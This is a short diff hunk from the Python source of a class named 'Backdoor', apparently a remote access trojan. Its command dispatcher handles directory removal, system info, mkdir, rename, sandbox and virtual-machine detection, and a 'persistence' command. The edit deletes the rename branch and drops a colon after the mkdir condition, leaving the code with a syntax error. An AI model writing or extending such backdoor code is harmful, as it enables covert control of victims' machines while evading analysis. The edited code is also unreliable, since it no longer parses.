@@ -393,10 +393,8 @@ class Backdoor:
                 result = self.rm_dir(cmd[1])
             elif cmd[0] == "sysinfo":
                 result = self.sysinfo()
-            elif cmd[0] == 'mkdir':
+            elif cmd[0] == 'mkdir'
                 result = self.mkdir(cmd[1])
-            elif cmd[0] == "rename":
-                result = self.rename(cmd[1], cmd[2])
             elif cmd[0] == "chk":
                 result = str(self.detectSandboxie()) +"\n"+ str(self.detectVM())
             elif cmd[0] == "persistence":
